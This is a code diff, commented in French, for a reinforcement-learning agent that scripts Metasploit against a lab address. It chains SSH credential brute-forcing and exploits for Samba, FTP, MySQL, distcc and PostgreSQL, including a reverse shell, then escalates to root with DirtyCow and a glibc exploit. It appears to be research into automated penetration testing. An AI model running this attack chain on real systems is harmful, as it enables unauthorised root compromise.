@@ -77,10 +77,10 @@ class QLearningTable:
     def initialise_state_actions(self): # à compléter
         return {
                 #"{}": [self.ssh_login, self.samba, self.ftp1, self.mysql, self.distcc, self.postgresql], #ensemble d'actions qu'on peut faire au début d'une partie
-                "{}": [self.ftp1, self.mysql, self.postgresql],
-                str(self.ssh_login): [self.dirtyCow, self.ls],
-                str(self.distcc): [self.dirtyCow, self.ls],
-                str(self.postgresql): [self.dirtyCow, self.ls],
+                "{}": [self.ssh_login, self.ftp1, self.mysql, self.postgresql, self.distcc],
+                str(self.ssh_login): [self.dirtyCow, self.glibc_origin_expansion_priv_esc],
+                str(self.distcc): [self.dirtyCow, self.glibc_origin_expansion_priv_esc],
+                str(self.postgresql): [self.dirtyCow, self.glibc_origin_expansion_priv_esc],
                 'terminal': []
                 }
         
@@ -231,153 +231,255 @@ class QLearningTable:
         return
     
     def ssh_login(self):
-        self.console.execute('use auxiliary/scanner/ssh/ssh_login')
-        time.sleep(4)
-        self.console.execute('set RHOSTS 192.168.56.101')
-        time.sleep(4)
-        self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
-        time.sleep(4)
-        self.console.execute('set STOP_ON_SUCCESS true')
-        time.sleep(4)
-        self.console.execute('run')
+        RPORT='22'
         
-        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console' 
-        
-        a= self.success
-        
-        if a:
-            self.console.execute('sessions -i ' + str(self.session))
-            time.sleep(4)
+        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
+            self.console.execute('use auxiliary/scanner/ssh/ssh_login')
+            time.sleep(10)
+            c= self.action_in_the_right_shell
             
-        if a:
-            self.console.execute('whoami')
-            time.sleep(4)
-        
-        b= self.whoami
-        
-        #while self.global_console_status:
-        #while console.console.read()['busy']:
-            #time.sleep(2)
+            if c:
+                self.console.execute('set RHOSTS 192.168.56.101')
+                time.sleep(4)
+                self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
+                time.sleep(4)
+                self.console.execute('set STOP_ON_SUCCESS true')
+                time.sleep(4)
+                self.console.execute('run')
+                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console' 
             
-        return a, b
+                a= self.success
+                
+                if a:
+                    self.console.execute('sessions -i ' + str(self.session))
+                    time.sleep(4)
+                    self.console.execute('whoami')
+                    time.sleep(4)
+                
+                b= self.whoami
+            
+                #while self.global_console_status:
+                #while console.console.read()['busy']:
+                #time.sleep(2)
+                return a, b
+            
+            else:
+                return False, 'Not root'
+        
+        return False, 'Not root'
             
     def samba(self):
-        self.console.execute('use exploit/multi/samba/usermap_script')
-        time.sleep(4)
-        self.console.execute('set RHOST 192.168.56.101')
-        time.sleep(4)
-        self.console.execute('set payload cmd/unix/bind_netcat')
-        time.sleep(4)
-        self.console.execute('exploit')
-        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
-        a= self.success
-        print(a)
+        RPORT='139'
         
-        if a:
-            self.console.execute('whoami')
+        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
+            self.console.execute('use exploit/multi/samba/usermap_script')
+            time.sleep(10)
+            c= self.action_in_the_right_shell
             
-        time.sleep(4) #sans le sleep il y a des problemes d'ordre d'execution
-        b= self.whoami
+            if c:
+                self.console.execute('set RHOST 192.168.56.101')
+                time.sleep(4)
+                self.console.execute('set payload cmd/unix/bind_netcat')
+                time.sleep(4)
+                self.console.execute('exploit')
+                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
+                a= self.success
+                print(a)
+                
+                if a:
+                    self.console.execute('whoami')
+                    
+                time.sleep(4) #sans le sleep il y a des problemes d'ordre d'execution
+                b= self.whoami
+                
+    #            if a:
+    #                time.sleep(3) 
+    #                self.console.execute('background')
+    #                time.sleep(3)
+    #                self.console.execute('y')
+                
+                return a, b
+            
+            else:
+                return False, "Not root"
         
-#        if a:
-#            time.sleep(3) 
-#            self.console.execute('background')
-#            time.sleep(3)
-#            self.console.execute('y')
-        
-        return a, b
+        return False, "Not root"
         
     def ftp1(self):
-        self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
-        time.sleep(4)
-        self.console.execute('set RHOST 192.168.56.101')
-        time.sleep(4)
-        self.console.execute('exploit')
-        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
-        a= self.success
+        RPORT='21'
         
-        if a:
-            self.console.execute('whoami')
-            time.sleep(4)
+        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
+            self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
+            time.sleep(10)
+            c= self.action_in_the_right_shell
             
-        b= self.whoami
+            if c:
+                self.console.execute('set RHOST 192.168.56.101')
+                time.sleep(4)
+                self.console.execute('exploit')
+                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
+                a= self.success
+                
+                if a:
+                    self.console.execute('whoami')
+                    time.sleep(4)
+                    
+                b= self.whoami
+                
+                return a, b
+            
+            else:
+                return False, 'Not root'
         
-        return a, b
-        
+        return False, 'Not root'
+    
     def mysql(self):
-        self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
-        time.sleep(4)
-        self.console.execute('set RHOST 192.168.56.101')
-        time.sleep(4)
-        self.console.execute('exploit')
-        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
-        a= self.success
+        RPORT='3306'
         
-        if a:
-            self.console.execute('whoami')
-            time.sleep(4)
+        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
+            self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
+            time.sleep(10)
+            c= self.action_in_the_right_shell
+            
+            if c:
+                self.console.execute('set RHOST 192.168.56.101')
+                time.sleep(4)
+                self.console.execute('exploit')
+                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
+                a= self.success
+                
+                if a:
+                    self.console.execute('whoami')
+                    time.sleep(4)
+                
+                b= self.whoami
+            
+                return a, b
+            
+            else:
+                return False, 'Not root'
+            
+        return False, 'Not root'
         
-        b= self.whoami
         
-        return a, b
-    
     def distcc(self):
-        self.console.execute('use exploit/unix/misc/distcc_exec')
-        time.sleep(4)
+        RPORT='3632'
         
-        self.console.execute('set RHOSTS 192.168.56.101')
-        time.sleep(3)
-        self.console.execute('exploit')
-        time.sleep(15)
-        a=self.success
+        try:
+            if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
+                self.console.execute('use exploit/unix/misc/distcc_exec')
+                time.sleep(10)
+                c=self.action_in_the_right_shell
+                
+                if c:
+                    self.console.execute('set RHOSTS 192.168.56.101')
+                    time.sleep(3)
+                    self.console.execute('exploit')
+                    time.sleep(15)
+                    a=self.success
+                    
+                    if a:
+                        self.console.execute('whoami')
+                        time.sleep(4)
+                    
+                    b= self.whoami
+                
+                    return a, b
+                
+                else:
+                    return False, 'Not root'
+            
+            return False, 'Not root'
         
-        if a:
-            self.console.execute('whoami')
-            time.sleep(4)
+        except BaseException:
+            print('An error was raised !')
+            return False, 'Not root'
         
-        b= self.whoami
-    
-        return a, b
-    
     def postgresql(self):
-        self.console.execute('use exploit/linux/postgres/postgres_payload')
-        time.sleep(4)
+        RPORT='5432'
         
-        self.console.execute('set RHOSTS 192.168.56.101')
-        time.sleep(3)
-        self.console.execute('set payload linux/x86/shell_reverse_tcp')
-        time.sleep(3)
-        self.console.execute('set LHOST 192.168.56.1') # A MODIFIER
-        time.sleep(3)
-        self.console.execute('exploit')
-        time.sleep(15)
-        a=self.success
+        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
+            self.console.execute('use exploit/linux/postgres/postgres_payload')
+            time.sleep(10)
+            c=self.action_in_the_right_shell
+            
+            if c:
+                self.console.execute('set RHOSTS 192.168.56.101')
+                time.sleep(3)
+                self.console.execute('set payload linux/x86/shell_reverse_tcp')
+                time.sleep(3)
+                self.console.execute('set LHOST 192.168.56.1') # A MODIFIER
+                time.sleep(3)
+                self.console.execute('exploit')
+                time.sleep(20)
+                a=self.success
+                
+                if a:   
+                    self.console.execute('whoami')
+                    time.sleep(4)
+                
+                b= self.whoami
+            
+                return a, b
+            
+            else:
+                return False, 'Not root'
         
-        if a:
+        return False, 'Not root'
+        
+    
+    def dirtyCow(self):  # suite de ssh_login
+        self.console.execute('/tmp/cow')
+        time.sleep(10) # (finalement j'en ai besoin) pas besoin finalement apparemment, car on reste sur le même thread
+        c= self.action_in_the_right_shell
+        
+        if c:
+            time.sleep(70)
+            self.console.execute('/usr/bin/passwd')
+            time.sleep(4)  # utile?
             self.console.execute('whoami')
             time.sleep(4)
+            b= self.whoami
+#            self.console.execute('background') # à modifier ?
+#            time.sleep(4)
+#            self.console.execute('y') # à modifier ?
+            
+            # revoir s'il y a un meilleur moyen de retourner self.success et self.whoami
+            if b=='root':
+                return True, 'root'
+            else: 
+                return False, 'Not root'
+            
+        else:
+            return False, 'Not root'
         
-        b= self.whoami
-    
-        return a, b
+    def glibc_origin_expansion_priv_esc(self):
+        if self.session >0:
+            self.background()
+            self.console.execute('use linux/local/glibc_origin_expansion_priv_esc')
+            time.sleep(4)
+            self.console.execute('set session ' + self.session)
+            time.sleep(4)
+            self.console.execute('run')
+            time.sleep(20)
+            
+            a= self.success
+                
+            if a:
+                #VERIFIER SI C'EST BIEN COMME CELA QUE FONCTIONNE L'EXPLOIT, C'EST A DIRE S'IL CREE UNE NOUVELLE SESSION ET PUIS IL FAUT SE CONNECTER A CETTE SESSION
+                self.console.execute('sessions -i ' + str(self.session))
+                time.sleep(4)
+                self.console.execute('whoami')
+                time.sleep(4)
+            
+            b= self.whoami
         
-    
-    def dirtyCow(self):  # suite de ssh_login et de distcc
-        self.console.execute('/tmp/cow')
-        time.sleep(80) # (finalement j'en ai besoin) pas besoin finalement apparemment, car on reste sur le même thread
-        self.console.execute('/usr/bin/passwd')
-        time.sleep(4)  # utile?
-        self.console.execute('whoami')
-        time.sleep(4)
-        b= self.whoami
-#        self.console.execute('background') # à modifier ?
-#        time.sleep(4)
-#        self.console.execute('y') # à modifier ?
-        
-        # revoir s'il y a un meilleur moyen de retourner self.success et self.whoami
-        if b=='root':
-            return True, 'root'
-        else: 
+            #while self.global_console_status:
+            #while console.console.read()['busy']:
+            #time.sleep(2)
+            return a, b
+            
+        else:
             return False, 'Not root'
         
     def ls(self):
